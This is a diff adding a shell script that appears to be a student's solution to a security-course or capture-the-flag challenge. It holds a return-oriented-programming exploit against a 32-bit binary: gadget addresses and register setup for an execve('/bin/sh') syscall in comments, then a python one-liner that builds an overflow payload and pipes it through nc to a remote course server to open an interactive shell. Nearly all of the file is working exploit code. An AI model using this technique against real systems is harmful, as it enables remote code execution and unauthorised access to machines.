@@ -1,0 +1,28 @@
+#!/bin/sh
+
+# breakpoint: 0x08048ea3, 0x08048e4b
+
+# binsh: 080ea068
+# eax: 11
+# ebx: &string_binsh
+# ecx: 0
+# edx: 0
+
+ #  80481c9:       5b                      pop    %ebx
+ #  80481ca:       c3                      ret
+
+ #  8054e40:       31 c0                   xor    %eax,%eax
+ #  8054e42:       c3                      ret
+
+ #  805cc5c:       40                      inc    %eax
+ #  805cc5d:       5f                      pop    %edi
+ #  805cc5e:       c3                      ret
+
+ #  806f0e0:	cd 80                	int    $0x80
+ #  806f0e2:	c3                   	ret    
+
+ #  080ea068 <binsh>:
+ #  80ea068:	68 e5 0b 08 00       	push   $0x80be5
+
+ (python -c "print 'a'*24 + '\x40\x4e\x05\x08' + '\xc9\x81\x04\x08' + '\x68\xe5\x0b\x08' + '\x5c\xcc\x05\x08\xff\xff\xff\xff' * 11 + '\x15\xc6\x06\x08'" && cat) | nc secprog.cs.nctu.edu.tw 10108
+#(python -c "print 'a'*24 + '\x40\x4e\x05\x08' + '\xc9\x81\x04\x08' + '\x68\xa0\x0e\x08' + '\x5c\xcc\x05\x08\xff\xff\xff\xff' * 11" && cat)
